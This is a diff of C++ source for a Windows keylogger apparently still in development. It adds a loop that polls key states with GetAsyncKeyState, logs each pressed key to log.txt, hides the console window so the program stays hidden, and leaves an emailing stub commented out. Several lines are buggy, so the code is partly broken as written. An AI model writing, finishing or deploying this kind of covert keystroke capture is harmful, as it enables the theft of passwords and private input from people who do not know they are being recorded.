@@ -2,43 +2,60 @@
 #include<fstream>
 #include <Windows.h>
 #include <time.h>
+#include<direct.h>
+#include <stdio.h>
 
 
-
-
-
+#pragma warning(disable : 4996)
+//^this disables the error message about the key saving method not ebing safe
 
 void logfile(int key)
 {
+	//TODO: create a new path for the logging file
 	
+	FILE* log;
+	log = fopen("log.txt", "a+");//a+ to create a file if it doesnt exist and writes at then end.
+	fprintf(log, "%s", &key);
+	fclose(log);
 	
 	
 	
 }
 
 
-void emailSender(std::string sender, std::fstream file, bool result)
+
+void hideconsole() 
+{
+	ShowWindow(GetConsoleWindow(), 0);
+	//hides the console window to keep the application hidden
+}
+
+/*void emailSender(std::string sender, std::fstream file, bool result)
 {
 
 }
-
+*/
 int main()
-{
+{	
 
-	char i;
+
+	hideconsole;
+
+
 	bool running = true;
 	while (running == true)
 	{
+		int i= 1;
 		//using ascii
 		for (i > 8; i <=255; i++) // starts and end of the mainly used ascii char
 		{
-			if (GetAsyncKeyState(i)==0)
-			{
-				continue;
-			}
+
 			if (GetAsyncKeyState(i)== -32767)
 			{
-				//TODO ADD the saving mechanishm
+				logfile(i);
+				//TODO improve saving mechinishm 
+				//add special characters ect...
+
 
 			}
 		}
@@ -47,7 +64,7 @@ int main()
 	}
 
 
-
+	
 	
 	return 0;
 }
